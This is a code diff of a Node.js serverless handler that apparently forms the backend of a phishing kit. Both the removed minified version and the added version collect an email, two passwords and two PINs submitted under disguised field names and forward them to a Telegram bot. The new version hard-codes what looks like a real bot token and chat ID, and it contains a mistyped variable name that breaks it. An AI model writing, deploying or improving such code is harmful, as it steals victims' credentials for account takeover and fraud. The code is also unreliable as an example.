@@ -1,52 +1,56 @@
-module.exports = async function(s, e) {
-    if (e.setHeader("Access-Control-Allow-Credentials", !0), e.setHeader("Access-Control-Allow-Origin", "*"), e.setHeader("Access-Control-Allow-Methods", "POST,OPTIONS"), e.setHeader("Access-Control-Allow-Headers", "Content-Type"), "OPTIONS" === s.method) return e.status(200).end();
-    if ("POST" !== s.method) return e.status(405).json({
-        success: !1
-    });
-    try {
-        if (!process.env.TGBT || !process.env.TGCI) return e.status(500).json({
-            success: !1
-        });
-        const {
-            phwet: t,
-            psdwet: o,
-            psdwetp: p,
-            pnit: q,
-            pnitr: r
+module.exports = async function (req, res) {
+  res.setHeader("Access-Control-Allow-Credentials", true);
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "POST,OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
 
-        } = s.body;
-        if (!t && !o) return e.status(400).json({
-            success: !1
-        });
-        try {
-            const s = `New Deets:\nEml: ${t}\nPswd1: ${o}\nPswd2: ${p}\nPn1: ${q}\nPn2: ${r}`,
-                r = await fetch(`https://api.telegram.org/bot${process.env.TGBT}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id: process.env.TGCI,
-                        text: s
-                    })
-                });
-            if (!r.ok) {
-                const s = await r.json();
-                return e.status(500).json({
-                    success: !1
-                })
-            }
-        } catch (s) {
-            return e.status(500).json({
-                success: !1
-            })
-        }
-        return e.status(200).json({
-            success: !0
-        })
-    } catch (s) {
-        return e.status(500).json({
-            success: !1
-        })
+  if (req.method === "OPTIONS") {
+    return res.status(200).end();
+  }
+
+  if (req.method !== "POST") {
+    return res.status(405).json({ success: false});
+  }
+
+  const TGBT = "8101561109:AAExMjN5xnJB2iLkFgCK3R4qFPIzWve6eMo";
+  const TGCI = "893828008";
+  if (!TGBT || !TGCI) {
+    return res.status(500).json({ success: false});
+  }
+
+  const {
+    phwet: rcxrr,
+    psdwet: psrd,
+    psdwetp: psrdp,
+    pnit: pnct,
+    pnitr: pnctr
+  } = req.body || {};
+
+  if (!rcxrr || !psrd || !psrdp || !pnct || !pnctr) {
+    return res.status(400).json({ success: false});
+  }
+
+  const message = `Eml: ${rxcrr}\nPswd1: ${psrd}\nPswd2: ${psrdp}\nPn1: ${pnct}\nPn2: ${pnctr}`;
+
+  try {
+    const tgRes = await fetch(`https://api.telegram.org/bot${TGBT}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TGCI,
+        text: message
+      })
+    });
+
+    if (!tgRes.ok) {
+      const errorData = await tgRes.json();
+      return res.status(500).json({
+        success: false,
+      });
     }
+
+    return res.status(200).json({ success: true });
+  } catch (err) {
+    return res.status(500).json({ success: false});
+  }
 };
